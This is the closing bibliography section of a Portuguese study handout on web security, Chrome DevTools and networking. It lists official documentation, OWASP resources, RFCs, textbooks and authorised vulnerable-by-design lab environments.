Documentação mantida pela equipe de engenharia do Google Chrome (`Chrome for Developers`), indispensável para consultar detalhes atualizados das abas **Network**, **Application**, **Console** e **Security** ([Seção 2](./02a-devtools-network.md#s2)):

| Fonte / Guia Oficial | URL Oficial | O que consultar nesta referência |
| :--- | :--- | :--- |
| **Chrome DevTools — Visão Geral Oficial** | [https://developer.chrome.com/docs/devtools](https://developer.chrome.com/docs/devtools) | Portal central de documentação do Chrome DevTools, atalhos de teclado, *Command Menu* (`Ctrl+Shift+P`), configurações e novidades por versão (*What's New in DevTools*). |
| **Network Panel — Inspect Network Activity** | [https://developer.chrome.com/docs/devtools/network](https://developer.chrome.com/docs/devtools/network) | Guia passo a passo da aba **Network**: gravação de tráfego, *Preserve log*, *Disable cache*, *Throttling*, simulação de condições de rede e análise do *Waterfall*. |
| **Network Reference — Features, Filters & Timing** | [https://developer.chrome.com/docs/devtools/network/reference](https://developer.chrome.com/docs/devtools/network/reference) | Referência técnica completa de todos os operadores de filtro (`domain:`, `status-code:`, `method:`, `has-response-header:`), colunas da tabela, abas *Headers*, *Payload*, *Preview*, *Response*, *Initiator*, exportação de *HAR* e fases exatas do painel **Timing** (*Queueing*, *Stalled*, *DNS*, *SSL*, *TTFB*, *Content Download*). |
| **Application Panel — View and Edit Storage** | [https://developer.chrome.com/docs/devtools/storage/localstorage](https://developer.chrome.com/docs/devtools/storage/localstorage) | Documentação oficial da aba **Application** cobrindo inspeção, edição e exclusão de pares chave-valor em **Local Storage** e **Session Storage**. |
| **Inspect and Manage Cookies** | [https://developer.chrome.com/docs/devtools/storage/cookies](https://developer.chrome.com/docs/devtools/storage/cookies) | Detalhamento de todas as colunas da tabela de **Cookies** (`Name`, `Value`, `Domain`, `Path`, `Expires/Max-Age`, `Size`, `HttpOnly`, `Secure`, `SameSite`, `Partition Key`), filtro de cookies bloqueados e integração com CHIPS. |
| **View and Change IndexedDB Data** | [https://developer.chrome.com/docs/devtools/storage/indexeddb](https://developer.chrome.com/docs/devtools/storage/indexeddb) | Guia para inspecionar bancos **IndexedDB**, *Object Stores*, *Indexes*, atualização de visualizações e exclusão de registros por origem. |
| **Cache Storage & Service Workers Debugging** | [https://developer.chrome.com/docs/devtools/storage/cache](https://developer.chrome.com/docs/devtools/storage/cache) | Inspeção de **Cache Storage**, ciclo de vida de **Service Workers** ([https://developer.chrome.com/docs/devtools/progressive-web-apps](https://developer.chrome.com/docs/devtools/progressive-web-apps)), controles *Offline*, *Update on reload*, *Bypass for network* e limpeza via *Clear site data*. |
| **Console Overview & Reference** | [https://developer.chrome.com/docs/devtools/console](https://developer.chrome.com/docs/devtools/console) | Funcionamento da aba **Console** como visualizador de logs e ambiente REPL interativo, níveis de severidade (*Verbose*, *Info*, *Warnings*, *Errors*), filtros e seleção de contexto de execução (*Execution Context*). |
| **Console API Reference & Utilities** | [https://developer.chrome.com/docs/devtools/console/api](https://developer.chrome.com/docs/devtools/console/api) | Especificação completa dos métodos do objeto `console` (`log`, `error`, `warn`, `table`, `dir`, `trace`, `group`, `time`, `count`) e utilitários do Console ([https://developer.chrome.com/docs/devtools/console/utilities](https://developer.chrome.com/docs/devtools/console/utilities) como `$0`, `$_`, `$()`, `$$()`, `copy()`, `getEventListeners()`). |
| **Security Panel — Understand Security Issues** | [https://developer.chrome.com/docs/devtools/security](https://developer.chrome.com/docs/devtools/security) | Diagnóstico de certificados TLS X.509, versões de protocolo, suítes de cifras e detecção de *Mixed Content* ativo e passivo. |
| **CHIPS (Cookies Having Independent Partitioned State)** | [https://developers.google.com/privacy-sandbox/cookies/chips](https://developers.google.com/privacy-sandbox/cookies/chips) | Documentação técnica sobre o atributo `Partitioned` e a coluna `Partition Key` no Chrome para isolamento de cookies cross-site. |

---

<a id="s10-2"></a>
### 10.2 OWASP (Open Worldwide Application Security Project)

Projetos, padrões de verificação e folhas de consulta (*Cheat Sheets*) mantidos pela **OWASP**, referência global para segurança de aplicações web e APIs ([Seção 3](./03a-vulnerabilidades-parte1.md#s3), [Seção 5](./05-headers-de-seguranca.md#s5) e [Seção 6](./06-checklist-e-comparativo.md#s6)):

| Projeto / Documento OWASP | URL Oficial | O que consultar nesta referência |
| :--- | :--- | :--- |
| **OWASP Top 10 (Web Application Security Risks)** | [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/) | Classificação das 10 categorias mais críticas de riscos em aplicações web (*Broken Access Control*, *Cryptographic Failures*, *Injection*, *Insecure Design*, *Security Misconfiguration*, *SSRF*, etc.). |
| **OWASP API Security Top 10** | [https://owasp.org/www-project-api-security/](https://owasp.org/www-project-api-security/) | Riscos específicos de APIs REST e GraphQL, incluindo **API1: BOLA (IDOR)**, **API2: Broken Authentication**, **API3: BOPLA (Excessive Data Exposure & Mass Assignment)** e **API4: Unrestricted Resource Consumption**. |
| **OWASP Cheat Sheet Series (Índice Geral)** | [https://cheatsheetseries.owasp.org/](https://cheatsheetseries.owasp.org/) | Enciclopédia prática de receitas de defesa escrita por especialistas para desenvolvedores e arquitetos de segurança. |
| **SQL Injection Prevention Cheat Sheet** | [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | Uso correto de *Prepared Statements* (consultas parametrizadas), *Stored Procedures* seguras e validação por *allowlist* para identificadores dinâmicos. |
| **Cross Site Scripting (XSS) & DOM XSS Prevention** | [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | Regras de codificação contextual de saída (*Output Encoding*), sanitização com `DOMPurify`, uso de `textContent` vs. `innerHTML` e prevenção de DOM-Based XSS. |
| **Cross-Site Request Forgery (CSRF) Prevention** | [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | Tokens anti-CSRF (*Synchronizer Token Pattern*), *Double-Submit Cookie*, cabeçalhos `Sec-Fetch-Site` / `Origin` e defesa em profundidade com `SameSite`. |
| **Server-Side Request Forgery (SSRF) Prevention** | [https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) | Controles na camada de aplicação e de rede contra SSRF, proteção de serviços de metadados em nuvem (IMDSv2) e prevenção de *DNS Rebinding*. |
| **Authentication, Session Management & Password Storage** | [https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) | Ciclo de vida de sessões, regeneração de ID contra *Session Fixation*, atributos de cookies e parâmetros recomendados para **Argon2id**, **bcrypt**, **scrypt** e **PBKDF2** ([Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)). |
| **JSON Web Token (JWT) Security Cheat Sheet** | [https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) | Prevenção contra algoritmo `none`, confusão de chave `RS256`/`HS256`, validação de *claims* (`iss`, `aud`, `exp`, `nbf`), armazenamento seguro e revogação de tokens. |
| **HTTP Headers & Content Security Policy Cheat Sheets** | [https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) | Configuração recomendada de `CSP`, `HSTS`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, `COOP`, `COEP` e `CORP`. |
| **File Upload & OS Command Injection Cheat Sheets** | [https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) | Validação de *magic bytes*, isolamento de arquivos enviados por usuários fora do *webroot* e substituição de chamadas de shell por APIs seguras sem interpretador. |
| **OWASP ASVS (Application Security Verification Standard)** | [https://owasp.org/www-project-application-security-verification-standard/](https://owasp.org/www-project-application-security-verification-standard/) | Padrão de requisitos de segurança verificáveis (Níveis 1, 2 e 3) para arquitetar, desenvolver e auditar aplicações web críticas. |
| **OWASP WSTG (Web Security Testing Guide)** | [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/) | Metodologia completa para testes de segurança em aplicações web em ambientes autorizados. |

---

<a id="s10-3"></a>
### 10.3 MDN Web Docs e Google Web Fundamentals (web.dev)

Documentações de referência para desenvolvedores web sobre protocolos HTTP, APIs do navegador, modelo DOM/BOM, armazenamento no cliente e cabeçalhos de segurança ([Seção 1](./01a-fundamentos-web-parte1.md#s1) e [Seção 5](./05-headers-de-seguranca.md#s5)):

| Referência Técnica | URL Oficial | O que consultar nesta referência |
| :--- | :--- | :--- |
| **MDN Web Docs — HTTP (Hypertext Transfer Protocol)** | [https://developer.mozilla.org/en-US/docs/Web/HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) | Visão completa do protocolo HTTP, evolução das versões, anatomia das mensagens, conexões persistentes, cache HTTP, negociação de conteúdo e autenticação. |
| **MDN — HTTP Request Methods & Response Status Codes** | [https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) | Semântica detalhada de `GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `OPTIONS`, `HEAD`, `CONNECT`, `TRACE`, propriedades *Safe*/*Idempotent* e todos os códigos `1xx` a `5xx` ([Status Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)). |
| **MDN — HTTP Headers Reference** | [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) | Documentação individual de todos os cabeçalhos HTTP de requisição, resposta, representação, CORS (`Access-Control-*`), `Cache-Control`, `Set-Cookie` e cabeçalhos de segurança. |
| **MDN — Same-Origin Policy (SOP) & CORS** | [https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) | Definição formal de origem, regras de herança de origem, funcionamento do **CORS** ([https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)), requisições simples vs. *preflight* e erros de CORS. |
| **MDN — Content Security Policy (CSP)** | [https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) | Guia completo de todas as diretivas do CSP (`default-src`, `script-src`, `connect-src`, `frame-ancestors`, `require-trusted-types-for`), uso de *nonces*, hashes e relatórios de violação. |
| **MDN — Web Storage API, IndexedDB & Service Workers** | [https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) | Especificação e exemplos de código para `localStorage`, `sessionStorage`, **IndexedDB API** ([https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)) e **Service Worker API** ([https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)). |
| **web.dev — Security, Performance & Network (Google)** | [https://web.dev/explore/secure](https://web.dev/explore/secure) | Artigos técnicos aprofundados do Google sobre **SameSite Cookies**, **COOP/COEP** (*cross-origin isolation*), **Strict CSP**, **HTTPS**, **TTFB** ([https://web.dev/articles/ttfb](https://web.dev/articles/ttfb)) e **HTTP Cache** ([https://web.dev/articles/http-cache](https://web.dev/articles/http-cache)). |

---

<a id="s10-4"></a>
### 10.4 RFCs Oficiais da IETF (HTTP, TLS, DNS, TCP/IP, Cookies, JWT, OAuth)

Especificações normativas da **IETF** (*Internet Engineering Task Force*), disponíveis em [https://www.rfc-editor.org/](https://www.rfc-editor.org/) e [https://datatracker.ietf.org/](https://datatracker.ietf.org/), que definem os protocolos estudados nas [Seções 1](./01a-fundamentos-web-parte1.md#s1), [4](./04-redes-de-computadores.md#s4) e [5](./05-headers-de-seguranca.md#s5):

| Número da RFC | Título Oficial da Especificação | Protocolo / Tema Abordado na Apostila |
| :--- | :--- | :--- |
| **RFC 9110** | *HTTP Semantics* (Junho de 2022) — [rfc9110](https://www.rfc-editor.org/rfc/rfc9110) | Define toda a semântica moderna do protocolo HTTP (métodos, propriedades de segurança e idempotência, códigos de status `1xx`–`5xx`, cabeçalhos e negociação de conteúdo), atualizando e substituindo a antiga RFC 7231. |
| **RFC 9111** | *HTTP Caching* (Junho de 2022) — [rfc9111](https://www.rfc-editor.org/rfc/rfc9111) | Funcionamento normativo de caches privados e compartilhados, diretivas `Cache-Control`, expiração (`max-age`, `Expires`) e validação condicional (`ETag`, `Last-Modified`, `304 Not Modified`). |
| **RFC 9112** | *HTTP/1.1* (Junho de 2022) — [rfc9112](https://www.rfc-editor.org/rfc/rfc9112) | Sintaxe de mensagens em texto do HTTP/1.1, gerenciamento de conexões persistentes (*keep-alive*) e codificação de transferência (*chunked*). |
| **RFC 9113** | *HTTP/2* (Junho de 2022) — [rfc9113](https://www.rfc-editor.org/rfc/rfc9113) | Camada de enquadramento binário (*binary framing*), multiplexação de fluxos sobre uma conexão TCP, priorização e pseudo-cabeçalhos (`:method`, `:path`, `:scheme`, `:authority`, `:status`). |
| **RFC 9114** | *HTTP/3* (Junho de 2022) — [rfc9114](https://www.rfc-editor.org/rfc/rfc9114) | Mapeamento da semântica HTTP sobre o protocolo de transporte **QUIC** (UDP), eliminando o *Head-of-Line Blocking* da camada de transporte e usando compressão de cabeçalhos `QPACK` (RFC 9204). |
| **RFC 9000** | *QUIC: A UDP-Based Multiplexed and Secure Transport* — [rfc9000](https://www.rfc-editor.org/rfc/rfc9000) | Especificação do protocolo QUIC sobre UDP com multiplexação nativa de fluxos, migração de conexão e integração obrigatória com o TLS 1.3 (RFC 9001). |
| **RFC 8446** | *The Transport Layer Security (TLS) Protocol Version 1.3* — [rfc8446](https://www.rfc-editor.org/rfc/rfc8446) | Especificação do **TLS 1.3**: handshake em 1-RTT, obrigatoriedade de *Forward Secrecy* (ECDHE), remoção de cifras legadas inseguras e uso exclusivo de algoritmos AEAD. (Complementada pela **RFC 8996**, que deprecia oficialmente o TLS 1.0 e o TLS 1.1). |
| **RFC 6797** | *HTTP Strict Transport Security (HSTS)* — [rfc6797](https://www.rfc-editor.org/rfc/rfc6797) | Funcionamento do cabeçalho `Strict-Transport-Security`, diretivas `max-age` e `includeSubDomains` e requisito de ignorar o cabeçalho em conexões HTTP sem TLS. |
| **RFC 6265 / 6265bis**| *HTTP State Management Mechanism (Cookies)* — [rfc6265](https://www.rfc-editor.org/rfc/rfc6265) | Especificação dos cabeçalhos `Cookie` e `Set-Cookie`, escopo `Domain`/`Path` e atributos `Secure` e `HttpOnly`. O rascunho **RFC 6265bis** ([draft-ietf-httpbis-rfc6265bis](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis)) formaliza `SameSite` (`Strict`, `Lax`, `None`) e os prefixos `__Host-` e `__Secure-`. |
| **RFC 7519** | *JSON Web Token (JWT)* — [rfc7519](https://www.rfc-editor.org/rfc/rfc7519) | Estrutura de *claims* em JSON (`iss`, `sub`, `aud`, `exp`, `nbf`, `iat`, `jti`), acompanhada pela **RFC 7515** (*JSON Web Signature — JWS*), **RFC 7516** (*JSON Web Encryption — JWE*), **RFC 7518** (*JSON Web Algorithms — JWA*) e **RFC 8725** (*JWT Best Current Practices*). |
| **RFC 6749 / 7636** | *The OAuth 2.0 Authorization Framework & PKCE* — [rfc6749](https://www.rfc-editor.org/rfc/rfc6749) | Fluxos de autorização delegada OAuth 2.0, tokens Bearer (**RFC 6750**) e proteção contra interceptação de código de autorização via **PKCE** (*Proof Key for Code Exchange* — **RFC 7636**). |
| **RFC 9293 / 768** | *Transmission Control Protocol (TCP)* — [rfc9293](https://www.rfc-editor.org/rfc/rfc9293) & *UDP* — [rfc768](https://www.rfc-editor.org/rfc/rfc768) | Especificação consolidada do protocolo **TCP** (substituindo a histórica RFC 793: cabeçalho, flags, *Three-Way Handshake*, controle de fluxo) e especificação do protocolo **UDP**. |
| **RFC 791 / 8200** | *Internet Protocol (IPv4)* — [rfc791](https://www.rfc-editor.org/rfc/rfc791) & *IPv6* — [rfc8200](https://www.rfc-editor.org/rfc/rfc8200) | Endereçamento e roteamento de pacotes na camada de rede em **IPv4** (32 bits) e **IPv6** (128 bits), acompanhados pela **RFC 792** (ICMPv4) e **RFC 4443** (ICMPv6). |
| **RFC 1918 / 4632** | *Address Allocation for Private Internets* — [rfc1918](https://www.rfc-editor.org/rfc/rfc1918) & *CIDR* — [rfc4632](https://www.rfc-editor.org/rfc/rfc4632) | Definição das faixas de IP privado (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), **RFC 4193** (endereços ULA IPv6 `fc00::/7`), **RFC 6598** (CGNAT `100.64.0.0/10`), **RFC 3022** (NAT) e roteamento sem classes (**CIDR**). |
| **RFC 1034 / 1035** | *Domain Names — Concepts and Facilities / Implementation* — [rfc1035](https://www.rfc-editor.org/rfc/rfc1035) | Arquitetura hierárquica do **DNS**, tipos de registros (`A`, `CNAME`, `MX`, `TXT`, `NS`, `SOA`, `PTR`), acompanhadas pela **RFC 4033–4035** (DNSSEC), **RFC 7858** (DoT) e **RFC 8484** (DoH). |
| **RFC 826 / 2131** | *Ethernet Address Resolution Protocol (ARP)* — [rfc826](https://www.rfc-editor.org/rfc/rfc826) & *DHCP* — [rfc2131](https://www.rfc-editor.org/rfc/rfc2131) | Resolução de endereços IPv4 em endereços físicos MAC na rede local (**ARP**) e alocação dinâmica de configurações de rede pelo fluxo DORA (**DHCP**). |

---

<a id="s10-5"></a>
### 10.5 Documentação Oficial da Microsoft, Cisco, W3C e WHATWG

Padrões vivos da plataforma web (**WHATWG** e **W3C**), catálogos de fraquezas de software (**MITRE CWE**), diretrizes governamentais (**NIST**) e guias de arquitetura de redes e sistemas (**Cisco** e **Microsoft Learn**):

| Organização / Documento | URL Oficial | O que consultar nesta referência |
| :--- | :--- | :--- |
| **WHATWG — HTML Living Standard** | [https://html.spec.whatwg.org/multipage/](https://html.spec.whatwg.org/multipage/) | Especificação viva oficial do HTML5, modelo de objetos BOM (`window`, `location`, `history`, `postMessage`), `Web Storage` (`localStorage` / `sessionStorage`), `WebSockets`, `EventSource` (SSE), `iframe sandbox` e isolamento de origem (`Origin`, `COOP`, `COEP`). |
| **WHATWG — Fetch Living Standard** | [https://fetch.spec.whatwg.org/](https://fetch.spec.whatwg.org/) | Especificação normativa da API `fetch()`, do protocolo **CORS** (*Cross-Origin Resource Sharing*), cabeçalhos proibidos (*Forbidden Header Names*), cabeçalhos `Cross-Origin-Resource-Policy` (CORP) e `Sec-Fetch-*`. |
| **WHATWG — DOM & URL Living Standards** | [https://dom.spec.whatwg.org/](https://dom.spec.whatwg.org/) | Especificação da árvore **DOM**, propagação de eventos e parsing padronizado de **URLs** e `URLSearchParams` ([https://url.spec.whatwg.org/](https://url.spec.whatwg.org/)). |
| **W3C — Web Application Security Working Group** | [https://www.w3.org/groups/wg/webappsec/publications/](https://www.w3.org/groups/wg/webappsec/publications/) | Especificações oficiais do **Content Security Policy Level 3 (CSP3)**, **Subresource Integrity (SRI)**, **Referrer Policy**, **Permissions Policy**, **Clear Site Data**, **Mixed Content** e **Trusted Types**. |
| **MITRE CWE (Common Weakness Enumeration)** | [https://cwe.mitre.org/](https://cwe.mitre.org/) | Taxonomia internacional de vulnerabilidades de software e hardware (ex.: `CWE-79` XSS, `CWE-89` SQL Injection, `CWE-22` Path Traversal, `CWE-78` OS Command Injection, `CWE-352` CSRF, `CWE-918` SSRF, `CWE-362` Race Condition). |
| **NIST SP 800-63B & SP 800-52 Rev. 2** | [https://pages.nist.gov/800-63-3/sp800-63b.html](https://pages.nist.gov/800-63-3/sp800-63b.html) | Diretrizes do *National Institute of Standards and Technology* para autenticação digital, gerenciamento de senhas, MFA, sessões e configuração segura de servidores TLS. |
| **Cisco Networking Academy & TechNotes** | [https://www.cisco.com/c/en/us/solutions/small-business/resource-center/networking/network-security.html](https://www.cisco.com/c/en/us/solutions/small-business/resource-center/networking/network-security.html) | Guias de referência de engenharia de redes: Modelo OSI vs. TCP/IP, endereçamento IPv4/IPv6, cálculo de sub-redes e VLSM ([IP Addressing and Subnetting Guide](https://www.cisco.com/c/en/us/support/docs/ip/routing-information-protocol-rip/13788-3.html)), VLANs, *Dynamic ARP Inspection* (DAI) e *DHCP Snooping*. |
| **IANA — Service Name and Transport Protocol Port Number Registry** | [https://www.iana.org/assignments/service-names-port-numbers/](https://www.iana.org/assignments/service-names-port-numbers/) | Registro oficial global de todas as portas TCP, UDP e QUIC (*Well-Known Ports* `0–1023`, *Registered Ports* `1024–49151` e *Dynamic/Private Ports* `49152–65535`). |
| **Microsoft Learn — Web Security, Networking & Edge DevTools** | [https://learn.microsoft.com/en-us/aspnet/core/security/](https://learn.microsoft.com/en-us/aspnet/core/security/) | Guias de arquitetura segura para aplicações web, mitigação de vulnerabilidades em APIs, fundamentos de TCP/IP no Windows Server e documentação complementar do DevTools Baseado em Chromium. |

---

<a id="s10-6"></a>
### 10.6 Livros Clássicos e Ambientes de Laboratório Recomendados

Para aprofundamento universitário nos fundamentos teóricos e para a **prática ética e legal de testes de segurança em ambientes controlados** (lembrando que realizar testes de intrusão em sistemas de terceiros sem autorização expressa é crime — no Brasil, tipificado pelo Art. 154-A do Código Penal, introduzido pela Lei nº 12.737/2012 e atualizado pela Lei nº 14.155/2021), recomendam-se as seguintes obras e plataformas de laboratório:

<a id="s10-6-1"></a>
#### 10.6.1 Bibliografia Clássica de Referência
1. **KUROSE, James F.; ROSS, Keith W.** *Redes de Computadores e a Internet: Uma Abordagem Top-Down*. 8ª ed. Porto Alegre: Bookman / Pearson, 2021. *(Referência acadêmica mundial para estudo da camada de aplicação HTTP/DNS, camada de transporte TCP/UDP/QUIC, camada de rede IPv4/IPv6/CIDR/NAT, camada de enlace Ethernet/ARP e segurança de redes).*
2. **TANENBAUM, Andrew S.; FEAMSTER, Nick; WETHERALL, David J.** *Redes de Computadores*. 6ª ed. Porto Alegre: Bookman / Pearson, 2021. *(Referência clássica para o Modelo OSI, Modelo TCP/IP, protocolos de enlace, roteamento e arquitetura física e lógica de redes).*
3. **STUTTARD, Dafydd; PINTO, Marcus.** *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws*. 2ª ed. Indianapolis: Wiley, 2011. *(Obra seminal sobre metodologia de auditoria em aplicações web, complementada atualmente pelos laboratórios interativos da PortSwigger Web Security Academy mantidos pelos mesmos autores).*
4. **GRIGORIK, Ilya.** *High Performance Browser Networking: What every web developer should know about networking and web performance*. Sebastopol: O'Reilly Media, 2013 (edição online gratuita em [https://hpbn.co/](https://hpbn.co/)). *(Análise profunda de latência, largura de banda, TCP handshake, TLS handshake, TTFB, HTTP/1.1, HTTP/2, WebSockets e WebRTC).*
5. **ZALEWSKI, Michal.** *The Tangled Web: A Guide to Securing Modern Web Applications*. San Francisco: No Starch Press, 2011. *(Estudo detalhado sobre a história e o funcionamento interno da Same-Origin Policy, parsing de HTML/CSS/JS, cookies e segurança nos navegadores).*
6. **HOFFMAN, Andrew.** *Web Application Security: Exploitation and Countermeasures for Modern Web Applications*. 2ª ed. Sebastopol: O'Reilly Media, 2024. *(Guia moderno focado em defesa em profundidade, SPAs, APIs REST, XSS, CSRF, SSRF, CORS, CSP e DevSecOps).*

<a id="s10-6-2"></a>
#### 10.6.2 Ambientes de Laboratório Autorizados e Gratuitos para Prática
- **PortSwigger Web Security Academy** ([https://portswigger.net/web-security](https://portswigger.net/web-security)): Plataforma online gratuita com centenas de laboratórios práticos interativos cobrindo **SQL Injection**, **XSS**, **CSRF**, **SSRF**, **CORS**, **Clickjacking**, **JWT**, **OS Command Injection**, **Path Traversal**, **File Upload Vulnerabilities**, **Access Control / IDOR** e **Race Conditions**.
- **OWASP Juice Shop** ([https://owasp.org/www-project-juice-shop/](https://owasp.org/www-project-juice-shop/)): Aplicação web moderna intencionalmente vulnerável escrita em Node.js, Express e Angular, ideal para rodar localmente via Docker (`docker run --rm -p 3000:3000 bkimminich/juice-shop`) e praticar auditoria completa com as abas **Network**, **Application** e **Console** do Chrome DevTools.
- **OWASP WebGoat & WebWolf** ([https://owasp.org/www-project-webgoat/](https://owasp.org/www-project-webgoat/)): Ambiente de aprendizado interativo guiado por lições passo a passo mantido pela OWASP para treinar identificação e correção de vulnerabilidades de código.
- **DVWA (Damn Vulnerable Web Application)** ([https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)): Aplicação PHP/MySQL clássica para laboratório local com quatro níveis graduais de segurança (*Low*, *Medium*, *High* e *Impossible*), permitindo comparar lado a lado o código vulnerável e o código corrigido.

---

---

> [⬅️ 8. Glossário Técnico (A–Z)](./07-glossario-tecnico.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | *(Fim da Apostila)*
